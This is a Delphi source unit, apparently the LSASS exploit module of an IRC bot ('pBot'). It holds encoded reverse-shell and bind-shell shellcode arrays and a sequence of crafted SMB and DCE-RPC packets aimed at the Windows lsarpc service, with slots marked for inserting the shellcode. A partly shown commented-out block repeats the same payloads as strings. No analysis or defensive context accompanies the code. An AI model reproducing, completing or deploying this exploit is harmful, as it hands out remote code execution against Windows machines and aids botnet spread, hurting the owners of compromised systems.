   Unit LSASSEXP;

   Interface

   Uses
     pBot,
     Windows, {for all stupid defines etc}
     Winsock; {for sockets?}

   Type
     PLsass2 = ^TLsass2;
     TLsass2 = Record
       iAdd  : String;
       Port  : Integer;
       Target: Integer;
     End;

   Var
     D: TLsass2;

     Function Exploit2(IP: String; Sock: TSocket; Which: Integer; Target: Integer): Bool;
     Procedure DoLsass;

   implementation

   var

   // reverse shellcode
   reverseshell: array[0..315] of char = (
   #$EB,#$10,#$5B,#$4B,#$33,#$C9,#$66,#$B9,#$25,#$01,#$80,#$34,#$0B,#$99,#$E2,#$FA,       // 16
   #$EB,#$05,#$E8,#$EB,#$FF,#$FF,#$FF,#$70,#$62,#$99,#$99,#$99,#$C6,#$FD,#$38,#$A9,       // 32
   #$99,#$99,#$99,#$12,#$D9,#$95,#$12,#$E9,#$85,#$34,#$12,#$F1,#$91,#$12,#$6E,#$F3,       // 48
   #$9D,#$C0,#$71,#$02,#$99,#$99,#$99,#$7B,#$60,#$F1,#$AA,#$AB,#$99,#$99,#$F1,#$EE,       // 64
   #$EA,#$AB,#$C6,#$CD,#$66,#$8F,#$12,#$71,#$F3,#$9D,#$C0,#$71,#$1B,#$99,#$99,#$99,       // 80
   #$7B,#$60,#$18,#$75,#$09,#$98,#$99,#$99,#$CD,#$F1,#$98,#$98,#$99,#$99,#$66,#$CF,       // 96
   #$89,#$C9,#$C9,#$C9,#$C9,#$D9,#$C9,#$D9,#$C9,#$66,#$CF,#$8D,#$12,#$41,#$F1,#$E6,       // 112
   #$99,#$99,#$98,#$F1,#$9B,#$99,#$9D,#$4B,#$12,#$55,#$F3,#$89,#$C8,#$CA,#$66,#$CF,       // 128
   #$81,#$1C,#$59,#$EC,#$D3,#$F1,#$FA,#$F4,#$FD,#$99,#$10,#$FF,#$A9,#$1A,#$75,#$CD,       // 144
   #$14,#$A5,#$BD,#$F3,#$8C,#$C0,#$32,#$7B,#$64,#$5F,#$DD,#$BD,#$89,#$DD,#$67,#$DD,       // 160
   #$BD,#$A4,#$10,#$C5,#$BD,#$D1,#$10,#$C5,#$BD,#$D5,#$10,#$C5,#$BD,#$C9,#$14,#$DD,       // 176
   #$BD,#$89,#$CD,#$C9,#$C8,#$C8,#$C8,#$F3,#$98,#$C8,#$C8,#$66,#$EF,#$A9,#$C8,#$66,       // 192
   #$CF,#$9D,#$12,#$55,#$F3,#$66,#$66,#$A8,#$66,#$CF,#$91,#$CA,#$66,#$CF,#$85,#$66,       // 208
   #$CF,#$95,#$C8,#$CF,#$12,#$DC,#$A5,#$12,#$CD,#$B1,#$E1,#$9A,#$4C,#$CB,#$12,#$EB,       // 224
   #$B9,#$9A,#$6C,#$AA,#$50,#$D0,#$D8,#$34,#$9A,#$5C,#$AA,#$42,#$96,#$27,#$89,#$A3,       // 240
   #$4F,#$ED,#$91,#$58,#$52,#$94,#$9A,#$43,#$D9,#$72,#$68,#$A2,#$86,#$EC,#$7E,#$C3,       // 256
   #$12,#$C3,#$BD,#$9A,#$44,#$FF,#$12,#$95,#$D2,#$12,#$C3,#$85,#$9A,#$44,#$12,#$9D,       // 272
   #$12,#$9A,#$5C,#$32,#$C7,#$C0,#$5A,#$71,#$99,#$66,#$66,#$66,#$17,#$D7,#$97,#$75,       // 288
   #$EB,#$67,#$2A,#$8F,#$34,#$40,#$9C,#$57,#$76,#$57,#$79,#$F9,#$52,#$74,#$65,#$A2,       // 304
   #$40,#$90,#$6C,#$34,#$75,#$60,#$33,#$F9,#$7E,#$E0,#$5F,#$E0);                          // 316

   // bind shellcode
   bindshell: array[0..403] of char = (
   #$EB,#$10,#$5A,#$4A,#$33,#$C9,#$66,#$B9,#$7D,#$01,#$80,#$34,#$0A,#$99,#$E2,#$FA,       // 16
   #$EB,#$05,#$E8,#$EB,#$FF,#$FF,#$FF,#$70,#$95,#$98,#$99,#$99,#$C3,#$FD,#$38,#$A9,       // 32
   #$99,#$99,#$99,#$12,#$D9,#$95,#$12,#$E9,#$85,#$34,#$12,#$D9,#$91,#$12,#$41,#$12,       // 48
   #$EA,#$A5,#$12,#$ED,#$87,#$E1,#$9A,#$6A,#$12,#$E7,#$B9,#$9A,#$62,#$12,#$D7,#$8D,       // 64
   #$AA,#$74,#$CF,#$CE,#$C8,#$12,#$A6,#$9A,#$62,#$12,#$6B,#$F3,#$97,#$C0,#$6A,#$3F,       // 80
   #$ED,#$91,#$C0,#$C6,#$1A,#$5E,#$9D,#$DC,#$7B,#$70,#$C0,#$C6,#$C7,#$12,#$54,#$12,       // 96
   #$DF,#$BD,#$9A,#$5A,#$48,#$78,#$9A,#$58,#$AA,#$50,#$FF,#$12,#$91,#$12,#$DF,#$85,       // 112
   #$9A,#$5A,#$58,#$78,#$9B,#$9A,#$58,#$12,#$99,#$9A,#$5A,#$12,#$63,#$12,#$6E,#$1A,       // 128
   #$5F,#$97,#$12,#$49,#$F3,#$9A,#$C0,#$71,#$1E,#$99,#$99,#$99,#$1A,#$5F,#$94,#$CB,       // 144
   #$CF,#$66,#$CE,#$65,#$C3,#$12,#$41,#$F3,#$9C,#$C0,#$71,#$ED,#$99,#$99,#$99,#$C9,       // 160
   #$C9,#$C9,#$C9,#$F3,#$98,#$F3,#$9B,#$66,#$CE,#$75,#$12,#$41,#$5E,#$9E,#$9B,#$99,       // 176
   #$9D,#$4B,#$AA,#$59,#$10,#$DE,#$9D,#$F3,#$89,#$CE,#$CA,#$66,#$CE,#$69,#$F3,#$98,       // 192
   #$CA,#$66,#$CE,#$6D,#$C9,#$C9,#$CA,#$66,#$CE,#$61,#$12,#$49,#$1A,#$75,#$DD,#$12,       // 208
   #$6D,#$AA,#$59,#$F3,#$89,#$C0,#$10,#$9D,#$17,#$7B,#$62,#$10,#$CF,#$A1,#$10,#$CF,       // 224
   #$A5,#$10,#$CF,#$D9,#$FF,#$5E,#$DF,#$B5,#$98,#$98,#$14,#$DE,#$89,#$C9,#$CF,#$AA,       // 240
   #$50,#$C8,#$C8,#$C8,#$F3,#$98,#$C8,#$C8,#$5E,#$DE,#$A5,#$FA,#$F4,#$FD,#$99,#$14,       // 256
   #$DE,#$A5,#$C9,#$C8,#$66,#$CE,#$79,#$CB,#$66,#$CE,#$65,#$CA,#$66,#$CE,#$65,#$C9,       // 272
   #$66,#$CE,#$7D,#$AA,#$59,#$35,#$1C,#$59,#$EC,#$60,#$C8,#$CB,#$CF,#$CA,#$66,#$4B,       // 288
   #$C3,#$C0,#$32,#$7B,#$77,#$AA,#$59,#$5A,#$71,#$76,#$67,#$66,#$66,#$DE,#$FC,#$ED,       // 304
   #$C9,#$EB,#$F6,#$FA,#$D8,#$FD,#$FD,#$EB,#$FC,#$EA,#$EA,#$99,#$DA,#$EB,#$FC,#$F8,       // 320
   #$ED,#$FC,#$C9,#$EB,#$F6,#$FA,#$FC,#$EA,#$EA,#$D8,#$99,#$DC,#$E1,#$F0,#$ED,#$CD,       // 336
   #$F1,#$EB,#$FC,#$F8,#$FD,#$99,#$D5,#$F6,#$F8,#$FD,#$D5,#$F0,#$FB,#$EB,#$F8,#$EB,       // 352
   #$E0,#$D8,#$99,#$EE,#$EA,#$AB,#$C6,#$AA,#$AB,#$99,#$CE,#$CA,#$D8,#$CA,#$F6,#$FA,       // 368
   #$F2,#$FC,#$ED,#$D8,#$99,#$FB,#$F0,#$F7,#$FD,#$99,#$F5,#$F0,#$EA,#$ED,#$FC,#$F7,       // 384
   #$99,#$F8,#$FA,#$FA,#$FC,#$E9,#$ED,#$99,#$FA,#$F5,#$F6,#$EA,#$FC,#$EA,#$F6,#$FA,       // 400
   #$F2,#$FC,#$ED,#$99);                                                                  // 404

   req1: array[0..136] of char = (
   #$00,#$00,#$00,#$85,#$FF,#$53,#$4D,#$42,#$72,#$00,#$00,#$00,#$00,#$18,#$53,#$C8,       // 16
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$FF,#$FE,       // 32
   #$00,#$00,#$00,#$00,#$00,#$62,#$00,#$02,#$50,#$43,#$20,#$4E,#$45,#$54,#$57,#$4F,       // 48
   #$52,#$4B,#$20,#$50,#$52,#$4F,#$47,#$52,#$41,#$4D,#$20,#$31,#$2E,#$30,#$00,#$02,       // 64
   #$4C,#$41,#$4E,#$4D,#$41,#$4E,#$31,#$2E,#$30,#$00,#$02,#$57,#$69,#$6E,#$64,#$6F,       // 80
   #$77,#$73,#$20,#$66,#$6F,#$72,#$20,#$57,#$6F,#$72,#$6B,#$67,#$72,#$6F,#$75,#$70,       // 96
   #$73,#$20,#$33,#$2E,#$31,#$61,#$00,#$02,#$4C,#$4D,#$31,#$2E,#$32,#$58,#$30,#$30,       // 112
   #$32,#$00,#$02,#$4C,#$41,#$4E,#$4D,#$41,#$4E,#$32,#$2E,#$31,#$00,#$02,#$4E,#$54,       // 128
   #$20,#$4C,#$4D,#$20,#$30,#$2E,#$31,#$32,#$00);                                         // 137

   req2: array[0..167] of char = (
   #$00,#$00,#$00,#$A4,#$FF,#$53,#$4D,#$42,#$73,#$00,#$00,#$00,#$00,#$18,#$07,#$C8,       // 16
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$FF,#$FE,       // 32
   #$00,#$00,#$10,#$00,#$0C,#$FF,#$00,#$A4,#$00,#$04,#$11,#$0A,#$00,#$00,#$00,#$00,       // 48
   #$00,#$00,#$00,#$20,#$00,#$00,#$00,#$00,#$00,#$D4,#$00,#$00,#$80,#$69,#$00,#$4E,       // 64
   #$54,#$4C,#$4D,#$53,#$53,#$50,#$00,#$01,#$00,#$00,#$00,#$97,#$82,#$08,#$E0,#$00,       // 80
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,       // 96
   #$57,#$00,#$69,#$00,#$6E,#$00,#$64,#$00,#$6F,#$00,#$77,#$00,#$73,#$00,#$20,#$00,       // 112
   #$32,#$00,#$30,#$00,#$30,#$00,#$30,#$00,#$20,#$00,#$32,#$00,#$31,#$00,#$39,#$00,       // 128
   #$35,#$00,#$00,#$00,#$57,#$00,#$69,#$00,#$6E,#$00,#$64,#$00,#$6F,#$00,#$77,#$00,       // 144
   #$73,#$00,#$20,#$00,#$32,#$00,#$30,#$00,#$30,#$00,#$30,#$00,#$20,#$00,#$35,#$00,       // 160
   #$2E,#$00,#$30,#$00,#$00,#$00,#$00,#$00);                                              // 168    (176)

   req3: array[0..221] of char = (
   #$00,#$00,#$00,#$DA,#$FF,#$53,#$4D,#$42,#$73,#$00,#$00,#$00,#$00,#$18,#$07,#$C8,       // 16
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$FF,#$FE,       // 32
   #$00,#$08,#$20,#$00,#$0C,#$FF,#$00,#$DA,#$00,#$04,#$11,#$0A,#$00,#$00,#$00,#$00,       // 48
   #$00,#$00,#$00,#$57,#$00,#$00,#$00,#$00,#$00,#$D4,#$00,#$00,#$80,#$9F,#$00,#$4E,       // 64
   #$54,#$4C,#$4D,#$53,#$53,#$50,#$00,#$03,#$00,#$00,#$00,#$01,#$00,#$01,#$00,#$46,       // 80
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$47,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$40,       // 96
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$40,#$00,#$00,#$00,#$06,#$00,#$06,#$00,#$40,       // 112
   #$00,#$00,#$00,#$10,#$00,#$10,#$00,#$47,#$00,#$00,#$00,#$15,#$8A,#$88,#$E0,#$48,       // 128
   #$00,#$4F,#$00,#$44,#$00,#$00,#$81,#$19,#$6A,#$7A,#$F2,#$E4,#$49,#$1C,#$28,#$AF,       // 144
   #$30,#$25,#$74,#$10,#$67,#$53,#$57,#$00,#$69,#$00,#$6E,#$00,#$64,#$00,#$6F,#$00,       // 160
   #$77,#$00,#$73,#$00,#$20,#$00,#$32,#$00,#$30,#$00,#$30,#$00,#$30,#$00,#$20,#$00,       // 176
   #$32,#$00,#$31,#$00,#$39,#$00,#$35,#$00,#$00,#$00,#$57,#$00,#$69,#$00,#$6E,#$00,       // 192
   #$64,#$00,#$6F,#$00,#$77,#$00,#$73,#$00,#$20,#$00,#$32,#$00,#$30,#$00,#$30,#$00,       // 208
   #$30,#$00,#$20,#$00,#$35,#$00,#$2E,#$00,#$30,#$00,#$00,#$00,#$00,#$00);                // 222    (224)

   req4: array[0..95] of char = (
   #$00,#$00,#$00,#$5C,#$FF,#$53,#$4D,#$42,#$75,#$00,#$00,#$00,#$00,#$18,#$07,#$C8,       // 16
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$FF,#$FE,       // 32
   #$00,#$08,#$30,#$00,#$04,#$FF,#$00,#$5C,#$00,#$08,#$00,#$01,#$00,#$31,#$00,#$00,       // 48
   #$5C,#$00,#$5C,#$00,#$31,#$00,#$39,#$00,#$32,#$00,#$2E,#$00,#$31,#$00,#$36,#$00,       // 64
   #$38,#$00,#$2E,#$00,#$31,#$00,#$2E,#$00,#$32,#$00,#$31,#$00,#$30,#$00,#$5C,#$00,       // 80
   #$49,#$00,#$50,#$00,#$43,#$00,#$24,#$00,#$00,#$00,#$3F,#$3F,#$3F,#$3F,#$3F,#$00);      // 96

   req5: array[0..103] of char = (
   #$00,#$00,#$00,#$64,#$FF,#$53,#$4D,#$42,#$A2,#$00,#$00,#$00,#$00,#$18,#$07,#$C8,       // 16
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$08,#$DC,#$04,       // 32
   #$00,#$08,#$40,#$00,#$18,#$FF,#$00,#$DE,#$DE,#$00,#$0E,#$00,#$16,#$00,#$00,#$00,       // 48
   #$00,#$00,#$00,#$00,#$9F,#$01,#$02,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,       // 64
   #$00,#$00,#$00,#$00,#$03,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$40,#$00,#$00,#$00,       // 80
   #$02,#$00,#$00,#$00,#$03,#$11,#$00,#$00,#$5C,#$00,#$6C,#$00,#$73,#$00,#$61,#$00,       // 96
   #$72,#$00,#$70,#$00,#$63,#$00,#$00,#$00);                                              // 104    (112)

   req6: array[0..159] of char = (
   #$00,#$00,#$00,#$9C,#$FF,#$53,#$4D,#$42,#$25,#$00,#$00,#$00,#$00,#$18,#$07,#$C8,       // 16
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$08,#$DC,#$04,       // 32
   #$00,#$08,#$50,#$00,#$10,#$00,#$00,#$48,#$00,#$00,#$00,#$00,#$04,#$00,#$00,#$00,       // 48
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$54,#$00,#$48,#$00,#$54,#$00,#$02,       // 64
   #$00,#$26,#$00,#$00,#$40,#$59,#$00,#$10,#$5C,#$00,#$50,#$00,#$49,#$00,#$50,#$00,       // 80
   #$45,#$00,#$5C,#$00,#$00,#$00,#$00,#$00,#$05,#$00,#$0B,#$03,#$10,#$00,#$00,#$00,       // 96
   #$48,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$B8,#$10,#$B8,#$10,#$00,#$00,#$00,#$00,       // 112
   #$01,#$00,#$00,#$00,#$00,#$00,#$01,#$00,#$6A,#$28,#$19,#$39,#$0C,#$B1,#$D0,#$11,       // 128
   #$9B,#$A8,#$00,#$C0,#$4F,#$D9,#$2E,#$F5,#$00,#$00,#$00,#$00,#$04,#$5D,#$88,#$8A,       // 144
   #$EB,#$1C,#$C9,#$11,#$9F,#$E8,#$08,#$00,#$2B,#$10,#$48,#$60,#$02,#$00,#$00,#$00);      // 160

   req7: array[0..123] of char = (
   #$00,#$00,#$0C,#$F4,#$FF,#$53,#$4D,#$42,#$25,#$00,#$00,#$00,#$00,#$18,#$07,#$C8,       // 16
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$08,#$DC,#$04,       // 32
   #$00,#$08,#$60,#$00,#$10,#$00,#$00,#$A0,#$0C,#$00,#$00,#$00,#$04,#$00,#$00,#$00,       // 48
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$54,#$00,#$A0,#$0C,#$54,#$00,#$02,       // 64
   #$00,#$26,#$00,#$00,#$40,#$B1,#$0C,#$10,#$5C,#$00,#$50,#$00,#$49,#$00,#$50,#$00,       // 80
   #$45,#$00,#$5C,#$00,#$00,#$00,#$00,#$00,#$05,#$00,#$00,#$03,#$10,#$00,#$00,#$00,       // 96
   #$A0,#$0C,#$00,#$00,#$01,#$00,#$00,#$00,#$88,#$0C,#$00,#$00,#$00,#$00,#$09,#$00,       // 112
   #$EC,#$03,#$00,#$00,#$00,#$00,#$00,#$00,#$EC,#$03,#$00,#$00);                          // 124    (128)
   // room for shellcode here ...

   Shit1: array[0..143] of char = (
   #$95,#$14,#$40,#$00,#$03,#$00,#$00,#$00,#$7C,#$70,#$40,#$00,#$01,#$00,#$00,#$00,       // 16
   #$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,       // 32
   #$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,       // 48
   #$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,       // 64
   #$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$7C,#$70,#$40,#$00,       // 80
   #$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,       // 96
   #$7C,#$70,#$40,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,       // 112
   #$00,#$00,#$00,#$00,#$7C,#$70,#$40,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,       // 128
   #$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$78,#$85,#$13,#$00,#$AB,#$5B,#$A6,#$E9);      // 144

   req8: array[0..103] of char = (
   #$00,#$00,#$10,#$F8,#$FF,#$53,#$4D,#$42,#$2F,#$00,#$00,#$00,#$00,#$18,#$07,#$C8,       // 12
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$08,#$FF,#$FE,       // 32
   #$00,#$08,#$60,#$00,#$0E,#$FF,#$00,#$DE,#$DE,#$00,#$40,#$00,#$00,#$00,#$00,#$FF,       // 48
   #$FF,#$FF,#$FF,#$08,#$00,#$B8,#$10,#$00,#$00,#$B8,#$10,#$40,#$00,#$00,#$00,#$00,       // 64
   #$00,#$B9,#$10,#$EE,#$05,#$00,#$00,#$01,#$10,#$00,#$00,#$00,#$B8,#$10,#$00,#$00,       // 80
   #$01,#$00,#$00,#$00,#$0C,#$20,#$00,#$00,#$00,#$00,#$09,#$00,#$AD,#$0D,#$00,#$00,       // 96
   #$00,#$00,#$00,#$00,#$AD,#$0D,#$00,#$00);                                              // 104    (112)
   // room for shellcode here ...

   Req9: array[0..111] of char = (
   #$00,#$00,#$0F,#$D8,#$FF,#$53,#$4D,#$42,#$25,#$00,#$00,#$00,#$00,#$18,#$07,#$C8,       // 12
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$08,#$18,#$01,       // 32
   #$00,#$08,#$70,#$00,#$10,#$00,#$00,#$84,#$0F,#$00,#$00,#$00,#$04,#$00,#$00,#$00,       // 48
   #$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$54,#$00,#$84,#$0F,#$54,#$00,#$02,       // 64
   #$00,#$26,#$00,#$00,#$40,#$95,#$0F,#$00,#$5C,#$00,#$50,#$00,#$49,#$00,#$50,#$00,       // 80
   #$45,#$00,#$5C,#$00,#$00,#$00,#$00,#$00,#$05,#$00,#$00,#$02,#$10,#$00,#$00,#$00,       // 96
   #$84,#$0F,#$00,#$00,#$01,#$00,#$00,#$00,#$6C,#$0F,#$00,#$00,#$00,#$00,#$09,#$00);      // 112

   Shit3: array[0..131] of char = (
   #$00,#$00,#$00,#$00,#$9A,#$A8,#$40,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,       // 12
   #$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,       // 32
   #$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,       // 48
   #$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,       // 64
   #$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$9A,#$A8,#$40,#$00,#$01,#$00,#$00,#$00,       // 80
   #$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$9A,#$A8,#$40,#$00,       // 96
   #$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,       // 112
   #$9A,#$A8,#$40,#$00,#$01,#$00,#$00,#$00,#$00,#$00,#$00,#$00,#$01,#$00,#$00,#$00,       // 128
   #$00,#$00,#$00,#$00);                                                                  // 132

   (*
   Var
   // reverse shellcode
   reverseshell: String = (
   '\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\x99\xE2\xFA'+
   '\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x62\x99\x99\x99\xC6\xFD\x38\xA9'+
   '\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3'+
   '\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE'+
   '\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99'+
   '\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF'+
   '\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6'+
   '\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF'+
   '\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD'+
   '\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD'+
   '\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD'+
   '\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66'+
   '\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66'+
   '\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB'+
   '\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3'+
   '\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3'+
   '\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D'+
   '\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75'+
   '\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2'+
   '\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0');

   // bind shellcode
   bindshell: String = (
   '\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x7D\x01\x80\x34\x0A\x99\xE2\xFA'+
   '\xEB\x05\xE8\xEB\xFF\xFF\xFF\x70\x95\x98\x99\x99\xC3\xFD\x38\xA9'+
   '\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xD9\x91\x12\x41\x12'+
   '\xEA\xA5\x12\xED\x87\xE1\x9A\x6A\x12\xE7\xB9\x9A\x62\x12\xD7\x8D'+
   '\xAA\x74\xCF\xCE\xC8\x12\xA6\x9A\x62\x12\x6B\xF3\x97\xC0\x6A\x3F'+
   '\xED\x91\xC0\xC6\x1A\x5E\x9D\xDC\x7B\x70\xC0\xC6\xC7\x12\x54\x12'+
   '\xDF\xBD\x9A\x5A\x48\x78\x9A\x58\xAA\x50\xFF\x12\x91\x12\xDF\x85'+
   '\x9A\x5A\x58\x78\x9B\x9A\x58\x12\x99\x9A\x5A\x12\x63\x12\x6E\x1A'+
   '\x5F\x97\x12\x49\xF3\x9A\xC0\x71\x1E\x99\x99\x99\x1A\x5F\x94\xCB'+
   '\xCF\x66\xCE\x65\xC3\x12\x41\xF3\x9C\xC0\x71\xED\x99\x99\x99\xC9'+
   '\xC9\xC9\xC9\xF3\x98\xF3\x9B\x66\xCE\x75\x12\x41\x5E\x9E\x9B\x99'+
   '\x9D\x4B\xAA\x59\x10\xDE\x9D\xF3\x89\xCE\xCA\x66\xCE\x69\xF3\x98'+
   '\xCA\x66\xCE\x6D\xC9\xC9\xCA\x66\xCE\x61\x12\x49\x1A\x75\xDD\x12'+
   '\x6D\xAA\x59\xF3\x89\xC0\x10\x9D\x17\x7B\x62\x10\xCF\xA1\x10\xCF'+
   '\xA5\x10\xCF\xD9\xFF\x5E\xDF\xB5\x98\x98\x14\xDE\x89\xC9\xCF\xAA'+
   '\x50\xC8\xC8\xC8\xF3\x98\xC8\xC8\x5E\xDE\xA5\xFA\xF4\xFD\x99\x14'+
   '\xDE\xA5\xC9\xC8\x66\xCE\x79\xCB\x66\xCE\x65\xCA\x66\xCE\x65\xC9'+
   '\x66\xCE\x7D\xAA\x59\x35\x1C\x59\xEC\x60\xC8\xCB\xCF\xCA\x66\x4B'+
   '\xC3\xC0\x32\x7B\x77\xAA\x59\x5A\x71\x76\x67\x66\x66\xDE\xFC\xED'+
   '\xC9\xEB\xF6\xFA\xD8\xFD\xFD\xEB\xFC\xEA\xEA\x99\xDA\xEB\xFC\xF8'+
   '\xED\xFC\xC9\xEB\xF6\xFA\xFC\xEA\xEA\xD8\x99\xDC\xE1\xF0\xED\xCD'+
   '\xF1\xEB\xFC\xF8\xFD\x99\xD5\xF6\xF8\xFD\xD5\xF0\xFB\xEB\xF8\xEB'+
   '\xE0\xD8\x99\xEE\xEA\xAB\xC6\xAA\xAB\x99\xCE\xCA\xD8\xCA\xF6\xFA'+
   '\xF2\xFC\xED\xD8\x99\xFB\xF0\xF7\xFD\x99\xF5\xF0\xEA\xED\xFC\xF7'+
   '\x99\xF8\xFA\xFA\xFC\xE9\xED\x99\xFA\xF5\xF6\xEA\xFC\xEA\xF6\xFA'+
   '\xF2\xFC\xED\x99');

   req1: String = (
   '\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE'+
   '\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F'+
   '\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02'+
   '\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F'+
   '\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70'+
   '\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30'+
   '\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54'+
   '\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00');

   req2: String = (
   '\x00\x00\x00\xA4\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE'+
   '\x00\x00\x10\x00\x0C\xFF\x00\xA4\x00\x04\x11\x0A\x00\x00\x00\x00'+
   '\x00\x00\x00\x20\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x69\x00\x4E'+
   '\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xE0\x00'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+
   '\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00'+
   '\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00'+
   '\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00'+
   '\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00'+
   '\x2E\x00\x30\x00\x00\x00\x00\x00');

   req3: String = (
   '\x00\x00\x00\xDA\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8'+
   '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE'+
